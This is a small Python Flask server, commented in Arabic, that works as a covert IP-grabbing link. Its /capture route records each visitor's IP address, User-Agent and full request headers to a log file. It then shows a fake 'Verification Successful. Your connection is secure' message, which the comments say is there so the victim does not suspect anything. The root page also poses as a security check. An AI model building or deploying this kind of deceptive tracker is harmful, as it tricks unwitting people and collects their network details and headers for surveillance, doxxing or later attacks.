from flask import Flask, request
import json
from datetime import datetime
import os

app = Flask(__name__)

# اسم الملف اللي بتتخزن فيه الصيدات (الـ IPs والبيانات)
LOG_FILE = "node_logs.txt"

@app.route('/')
def home():
    return "<h1>System Online</h1><p>Security Check Active.</p>"

@app.route('/capture')
def capture():
    # 1. سحب بيانات "الكمبيوتر" أو "السيرفر" اللي دخل
    # نستخدم X-Forwarded-For لأن الاستضافات غالباً تحط الآيبي الحقيقي هناك
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    headers = dict(request.headers)
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 2. تجهيز البيانات بشكل مرتب
    log_entry = {
        "Time": time_now,
        "IP_Address": ip,
        "Device_Info": user_agent,
        "Full_Headers": headers
    }

    # 3. حفظ الصيدة في الملف (اللاقط)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(log_entry, indent=4, ensure_ascii=False) + "\n" + ("="*50) + "\n")

    # 4. رسالة تظهر للي يفتح الرابط عشان ما يشك
    return "Verification Successful. Your connection is secure."

if __name__ == '__main__':
    # هذا السطر مهم جداً للاستضافات العالمية
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
